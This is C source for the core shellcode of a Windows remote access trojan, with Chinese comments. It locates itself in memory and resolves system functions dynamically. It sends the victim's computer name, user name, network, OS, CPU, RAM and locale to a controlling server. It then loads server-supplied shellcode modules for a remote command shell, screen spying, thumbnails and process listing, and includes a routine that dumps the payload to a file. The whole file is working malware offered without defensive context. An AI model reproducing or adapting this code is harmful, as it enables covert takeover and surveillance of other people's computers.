#include "shellcodes.h"
#include "global_data.h"

typedef void(__cdecl *_submodule_entry)(global_data_t *global_data);

/*
  1. 初始化buffer模块，msglite模块，协议发送接收模块
  2. 与服务器进行通讯，接收其它模块
*/

extern void __stdcall shellcode_main_entry(global_data_t *global_data, SOCKET s);

extern buffer_t * __cdecl buffer_new(global_data_t *global_data);
extern void __cdecl buffer_free(buffer_t *buf);
extern void __cdecl buffer_checkspace(buffer_t *buf, size_t l);
extern void __cdecl buffer_write(buffer_t *buf, const void *v, size_t l);
extern void __cdecl buffer_clear(buffer_t *buf);

extern void __cdecl msgpack_lite_pack_nil(buffer_t *buf);
extern void __cdecl msgpack_lite_pack_boolean(buffer_t *buf, bool b);
extern void __cdecl msgpack_lite_pack_signed(buffer_t *buf, int64_t i);
extern void __cdecl msgpack_lite_pack_unsigned(buffer_t *buf, uint64_t i);
extern void __cdecl msgpack_lite_pack_float(buffer_t *buf, float f);
extern void __cdecl msgpack_lite_pack_double(buffer_t *buf, double d);
extern void __cdecl msgpack_lite_pack_real(buffer_t *buf, double d);
extern void __cdecl msgpack_lite_pack_map_size(buffer_t *buf, uint32_t n);
extern void __cdecl msgpack_lite_pack_str(buffer_t *buf, const char *v);
extern void __cdecl msgpack_lite_pack_widestr(buffer_t *buf, const wchar_t *v);
extern void __cdecl msgpack_lite_pack_bin_size(buffer_t *buf, uint32_t n);
extern void __cdecl msgpack_lite_pack_bin(buffer_t *buf, const void* v, uint32_t l);
extern void __cdecl msgpack_lite_pack_array_size(buffer_t *buf, uint32_t n);
extern void __cdecl msgpack_lite_pack_insert(buffer_t *buf, const void *v, uint32_t l);

extern int __cdecl send_packet(global_data_t *global_data, SOCKET s, uint8_t cmd, const char *buf, size_t size);
extern int __cdecl recv_packet(global_data_t *global_data, SOCKET s, uint8_t *cmd, void **buf, size_t *size);

extern PBITMAPINFO __cdecl bitmap_create_info(global_data_t *global_data, HDC dc, int bit_count, int width, int height, int *bi_size);
extern bitmap_t * __cdecl bitmap_new(global_data_t *global_data, HDC src_dc, int bit_count, int width, int height);
extern void __cdecl bitmap_free(bitmap_t *bmp);
extern void * __cdecl bitmap_scan_line(bitmap_t *bmp, int line);
extern void __cdecl bitmap_save(bitmap_t *bmp, buffer_t *buf);

extern int send_information(global_data_t *global_data, SOCKET s);
extern int wait_command(global_data_t *global_data, SOCKET s);
extern int __cdecl process_packet(global_data_t *global_data, SOCKET s, uint8_t cmd, void *data, size_t size);
extern void __cdecl socket_main(global_data_t *global_data, SOCKET s);

extern void __cdecl shellcode_main_code_end();

#pragma pack(push)
#pragma pack(1)
typedef struct {
  char user32[7];
  char version[8];
  char shlwapi[8];
  char gdi32[6];
  char id[3];
  char group[6];
  char computer_name[14];
  char username[9];
  char lan[4];
  char os[3];
  char cpu[4];
  char ram[4];
  char acc[4];
  char language[9];
} shellcode_main_data_t;
#pragma pack(pop)

#define FIX(name) extra->##name = (_##name)(delta + (char *)name)

#pragma optimize("ts", on)

void __stdcall shellcode_main_entry(global_data_t *global_data, SOCKET s) {
  uint32_t delta;
  
  __asm {
    call x;
  x:
    pop	eax;
    sub	eax, offset x;
    mov	delta, eax
  }

  extra_t *extra = (extra_t *)global_data->extra_data;

  FIX(buffer_new);
  FIX(buffer_new);
  FIX(buffer_free);
  FIX(buffer_checkspace);
  FIX(buffer_write);
  FIX(buffer_clear);

  FIX(msgpack_lite_pack_nil);
  FIX(msgpack_lite_pack_boolean);
  FIX(msgpack_lite_pack_signed);
  FIX(msgpack_lite_pack_unsigned);
  FIX(msgpack_lite_pack_float);
  FIX(msgpack_lite_pack_double);
  FIX(msgpack_lite_pack_real);
  FIX(msgpack_lite_pack_map_size);
  FIX(msgpack_lite_pack_str);
  FIX(msgpack_lite_pack_widestr);
  FIX(msgpack_lite_pack_bin_size);
  FIX(msgpack_lite_pack_bin);
  FIX(msgpack_lite_pack_array_size);
  FIX(msgpack_lite_pack_insert);

  FIX(send_packet);
  FIX(recv_packet);

  FIX(send_packet);
  FIX(recv_packet);

  FIX(bitmap_new);
  FIX(bitmap_free);
  FIX(bitmap_scan_line);
  FIX(bitmap_save);


  shellcode_main_data_t *data = (shellcode_main_data_t *)(delta + (char *)shellcode_main_code_end);

  extra->shellcode_main_data = data;

  extra->user32 = xLoadLibraryA(data->user32);
  extra->version = xLoadLibraryA(data->version);
  extra->shlwapi = xLoadLibraryA(data->shlwapi);
  extra->gdi32 = xLoadLibraryA(data->gdi32);

  // kernel32
  dlsym(global_data->kernel32, WideCharToMultiByte);
  dlsym(global_data->kernel32, GetTickCount);
  dlsym(global_data->kernel32, GetComputerNameW);
  dlsym(global_data->kernel32, GlobalMemoryStatusEx);
  dlsym(global_data->kernel32, GetLocaleInfoA);
  dlsym(global_data->kernel32, CreatePipe);
  dlsym(global_data->kernel32, GetExitCodeProcess);
  dlsym(global_data->kernel32, PeekNamedPipe);
  dlsym(global_data->kernel32, ReadFile);
  dlsym(global_data->kernel32, WriteFile);
  dlsym(global_data->kernel32, TerminateProcess);
  dlsym(global_data->kernel32, GetCurrentThreadId);
  dlsym(global_data->kernel32, lstrcmpiA);
  dlsym(global_data->kernel32, GetSystemDirectoryA);
  dlsym(global_data->kernel32, lstrcatA);

  // advapi32
  dlsym(global_data->advapi32, GetUserNameW);
  dlsym(global_data->advapi32, RegQueryValueExA);

  // ws2_32
  dlsym(global_data->ws2_32, gethostname);
  dlsym(global_data->ws2_32, inet_ntoa);

  // version
  dlsym(extra->version, GetFileVersionInfoSizeA);
  dlsym(extra->version, VerQueryValueA);
  dlsym(extra->version, GetFileVersionInfoA);

  // shlwapi
  dlsym(extra->shlwapi, wnsprintfA);

  // user32
  dlsym(extra->user32, MessageBoxA);
  dlsym(extra->user32, SetRect);
  dlsym(extra->user32, GetUserObjectInformationA);
  dlsym(extra->user32, SetThreadDesktop);
  dlsym(extra->user32, CloseDesktop);
  dlsym(extra->user32, GetSystemMetrics);
  dlsym(extra->user32, GetDesktopWindow);
  dlsym(extra->user32, GetDC);
  dlsym(extra->user32, ReleaseDC);
  dlsym(extra->user32, SetRectEmpty);
  dlsym(extra->user32, GetCursorPos);
  dlsym(extra->user32, GetThreadDesktop);
  dlsym(extra->user32, OpenInputDesktop);

  // gdi32
  dlsym(extra->gdi32, CreateCompatibleBitmap);
  dlsym(extra->gdi32, GetDIBits);
  dlsym(extra->gdi32, CreateDIBSection);
  dlsym(extra->gdi32, CreateCompatibleDC);
  dlsym(extra->gdi32, SelectObject);
  dlsym(extra->gdi32, DeleteDC);
  dlsym(extra->gdi32, DeleteObject);
  dlsym(extra->gdi32, BitBlt);
  dlsym(extra->gdi32, StretchBlt);

  socket_main(global_data, s);

  if (extra->state & STATE_CMD_SHELL) {
    xcmd_shell_finalize(INVALID_SOCKET);
  }

  if (extra->state & STATE_SCREEN_SPY) {
    xscreenspy_finalize(INVALID_SOCKET);
  }

  if (extra->state & STATE_THUMBNAIL) {
    extra->state &= ~STATE_THUMBNAIL;
    xthumbnail.tick = 0;
  }

  if (xinformation.code != 0) {
    free_executable_memory(0, xinformation.code);
    xinformation.code = 0;
  }

  if (xcmd_shell.code != 0) {
    free_executable_memory(0, xcmd_shell.code);
    xcmd_shell.code = 0;
  }

  if (xthumbnail.code != 0) {
    free_executable_memory(0, xthumbnail.code);
    xthumbnail.code = 0;
  }

  if (xscreenspy.code != 0) {
    free_executable_memory(0, xscreenspy.code);
    xscreenspy.code = 0;
  }
  
  if (xprocess.code != 0) {
    free_executable_memory(0, xprocess.code);
    xprocess.code = 0;
  }
}

#undef DELTA  // undef macro DELTA

// buffer 模块
#include "buffer.inc"
// magpack lite模块
#include "msgpack_lite.inc"
// 数据包模块
#include "proto.inc"
// bitmap 模块
#include "bitmap.inc"

int send_information(global_data_t *global_data, SOCKET s) {
  shellcode_main_data_t *data = (shellcode_main_data_t *)extra_data()->shellcode_main_data;
  buffer_t *buf = xbuffer_new();

  uint32_t size;
  wchar_t tempw[1024];
  char tempa[1024];

  mlp_map_size(buf, 11);
  /* 1 */{
    size = 1024;
    xGetComputerNameW(tempw, &size);
    tempw[size] = 0;
    mlp_str(buf, data->computer_name);
    mlp_widestr(buf, tempw);
  }
  /* 2 */{
    size = 1024;
    xGetUserNameW(tempw, &size);
    tempw[size] = 0;
    mlp_str(buf, data->username);
    mlp_widestr(buf, tempw);
  }
  /* 3 */{
    xget_lan_info(tempa);
    mlp_str(buf, data->lan);
    mlp_str(buf, tempa);
  }
  /* 4 */{
    mlp_str(buf, data->version);
    mlp_signed(buf, FUNCTIONS_VERSION);
  }
  /* 5 */{
    xget_os_version(tempa, 1024);
    mlp_str(buf, data->os);
    mlp_str(buf, tempa);
  }
  /* 6 */{
    mlp_str(buf, data->cpu);
    mlp_signed(buf, xget_cpu_frequency());
  }
  /* 7 */{
    MEMORYSTATUSEX msex;
    msex.dwLength = sizeof(MEMORYSTATUSEX);
    xGlobalMemoryStatusEx(&msex);
    mlp_str(buf, data->ram);
    mlp_signed(buf, msex.ullTotalPhys);
  }
  /* 8 */{
    mlp_str(buf, data->acc);
    int method = 0;
    if (global_data->socks5) method = 1;
    mlp_signed(buf, 1);
  }
  /* 9 */  {
    int len = xGetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, tempa, 1024);
    tempa[len] = 0;
    mlp_str(buf, data->language);
    mlp_str(buf, tempa);
  }
  /* 10 */ {
    mlp_str(buf, data->id);
    mlp_widestr(buf, global_data->id);
  }
  /* 11 */ {
    mlp_str(buf, data->group);
    mlp_widestr(buf, global_data->group);
  }
  int ret = xsend_packet(s, CMD_LOGIN_INFO, (const char *)buf->data, buf->size);

  xbuffer_free(buf);

  return ret;
}

int wait_command(global_data_t *global_data, SOCKET s) {
  int ret;

  for (;;) {
    if (extra_data()->state != 0) {
      ret = wait_buffer(s, 0, 10);
    } else {
      ret = wait_buffer(s, WAIT_BUFFER_TIMEOUT, 0);
    }

    if (ret < 0) return SOCKET_ERROR;

    if (ret != 0) break;

    if (extra_data()->state != 0) {
      if (extra_data()->state & STATE_SCREEN_SPY) {
        // 发送screenspy
        if (xscreenspy_send(s) == SOCKET_ERROR) return SOCKET_ERROR;
      }

      if (extra_data()->state & STATE_CMD_SHELL) {
        if (xcmd_shell_send_result(s) == SOCKET_ERROR) return SOCKET_ERROR;
      }

      if (extra_data()->state & STATE_THUMBNAIL) {
        if (xthumbnail_send(s) == SOCKET_ERROR) return SOCKET_ERROR;
      }

      continue;
    }

    // 发送PING保活
    if (xsend_packet(s, CMD_PING, 0, 0) < 0) return SOCKET_ERROR;
  }

  return 0;
}

void * __cdecl initalize_code(global_data_t *global_data, void *code, size_t size) {
  void *ret = alloc_executable_memory(0, size);
  if (ret == 0) return 0;

  copy_memory(ret, code, size);

  _submodule_entry entry = (_submodule_entry)ret;
  entry(global_data);

  return ret;
}

int __cdecl process_packet(global_data_t *global_data, SOCKET s, uint8_t cmd, void *data, size_t size) {
  void *code;

  // information code
  if (cmd == CMD_SHELLCODE_INFORMATION) {
    code = initalize_code(global_data, data, size);
    if (code == 0) return SOCKET_ERROR;

    xinformation.code = code;

    return send_information(global_data, s);
  }

  // cmd_shell code
  if (cmd == CMD_SHELLCODE_CMD_SHELL) {
    code = initalize_code(global_data, data, size);
    if (code == 0) return SOCKET_ERROR;

    xcmd_shell.code = code;

    return xcmd_shell_initialize(s);
  }

  // thumbnail code
  if (cmd == CMD_SHELLCODE_THUMBNAIL) {
    code = initalize_code(global_data, data, size);
    if (code == 0) return SOCKET_ERROR;

    xthumbnail.code = code;

    extra_data()->state |= STATE_THUMBNAIL;

    return xthumbnail_send(s);
  } 

  // screenspy code
  if (cmd == CMD_SHELLCODE_SCREENSPY) {
    code = initalize_code(global_data, data, size);
    if (code == 0) return SOCKET_ERROR;

    xscreenspy.code = code;

    return xscreenspy_initalize(s, xscreenspy.bit_count);
  }

  // process code
  if (cmd == CMD_SHELLCODE_PROCESS) {
    code = initalize_code(global_data, data, size);
    if (code == 0) return SOCKET_ERROR;

    xprocess.code = code;

    return xprocess_send_list(s);
  }

  // pong
  if (cmd == CMD_PONG) {
    return 0;
  }

  // ping
  if (cmd == CMD_PING) {
    return xsend_packet(s, CMD_PONG, (char *)data, sizeof(uint32_t));
  }
  
  // begin cmd_shell
  if (cmd == CMD_BEGIN_CMDSHELL) {
    // 从服务器获取代码
    if (xcmd_shell.code == 0) {
      return xsend_packet(s, CMD_SHELLCODE_CMD_SHELL, 0, 0);
    }

    if (!(extra_data()->state & STATE_CMD_SHELL)) {
      return xcmd_shell_initialize(s);
    }
  }

  // cmd_shell data
  if (cmd == CMD_CMDSHELL_DATA) {
    if (extra_data()->state & STATE_CMD_SHELL) {
      return xcmd_shell_execute(s, (const char *)((uint32_t *)data));
    }
  }

  // stop cmd_shell
  if (cmd == CMD_STOP_CMDSHELL) {
    if (extra_data()->state & STATE_CMD_SHELL) {
      return xcmd_shell_finalize(s);
    }
  }
  
  // begin screenspy
  if (cmd == CMD_BEGIN_SCREENSPY) {
    if (xscreenspy.code == 0) {
      xscreenspy.bit_count = *(uint32_t*)data;
      return xsend_packet(s, CMD_SHELLCODE_SCREENSPY, 0, 0);
    }

    if (!(extra_data()->state & STATE_SCREEN_SPY)) {
      return xscreenspy_initalize(s, *(uint32_t*)data);
    }
  }
  
  // end screenspy
  if (cmd == CMD_STOP_SCREENSPY) {
    if (extra_data()->state & STATE_SCREEN_SPY) {
      return xscreenspy_finalize(s);
    }
  }
  
  // begin thumbnail
  if (cmd == CMD_THUMBANIL_START) {    
    if (xthumbnail.code == 0) {
      return xsend_packet(s, CMD_SHELLCODE_THUMBNAIL, 0, 0);
    }

    extra_data()->state |= STATE_THUMBNAIL;
    return xthumbnail_send(s);
  }

  // end thumbnail
  if (cmd == CMD_THUMBANIL_END) {
    xthumbnail.tick = 0;
    extra_data()->state &= ~STATE_THUMBNAIL;
  }

  // get process list
  if (cmd == CMD_GET_PROCESS_LIST) {
    if (xprocess.code == 0) {
      return xsend_packet(s, CMD_SHELLCODE_PROCESS, 0, 0);
    }

    return xprocess_send_list(s);
  }

  return 0;
}

void __cdecl socket_main(global_data_t *global_data, SOCKET s) {
  int ret;
  uint8_t cmd;
  void *buf;
  size_t size;

  // 先获取information code
  if (extra_data()->information.code == 0) {
    if (xsend_packet(s, CMD_SHELLCODE_INFORMATION, 0, 0) < 0) return;
  } else {
    send_information(global_data, s);
  }

  for (;;) {
    ret = wait_command(global_data, s);
    if (ret < 0) return;

    ret = xrecv_packet(s, &cmd, &buf, &size);
    if (ret < 0) return;

    ret = process_packet(global_data, s, cmd, buf, size);

    if (buf != 0) free_memory(buf);

    if (ret == SOCKET_ERROR) return;
  }
}

void __cdecl shellcode_main_code_end() {
  printf(__FUNCTION__);
}

#pragma optimize("ts", off)

#undef FIX             // undef macro FIX

void shellcode_main_save(char *filename) {
  char *start, *end;
  FILE *f;

  start = (char *)shellcode_main_entry;
  end = (char *)shellcode_main_code_end;
  
  printf("[*] shellcode_main code size = 0x%X\n", end - start);

  f = fopen(filename, "wb");
  fwrite(start, 1, end - start, f);

  shellcode_main_data_t data;
  
  memset(&data, 0, sizeof(data));

  lstrcpyA(data.user32, "user32");
  lstrcpyA(data.version, "version");
  lstrcpyA(data.shlwapi, "shlwapi");
  lstrcpyA(data.gdi32, "gdi32");
  lstrcpyA(data.id, "id");
  lstrcpyA(data.computer_name, "computer_name");
  lstrcpyA(data.username, "username");
  lstrcpyA(data.lan, "lan");
  lstrcpyA(data.os, "os");
  lstrcpyA(data.cpu, "cpu");
  lstrcpyA(data.ram, "ram");
  lstrcpyA(data.acc, "acc");
  lstrcpyA(data.language, "language");
  lstrcpyA(data.group, "group");
  fwrite(&data, 1, sizeof(data), f);

  printf("[*] shellcode_main data size = 0x%X\n", sizeof(data));

  fclose(f);
  printf("[*] save shellcode main to %s success.\n", filename);
}
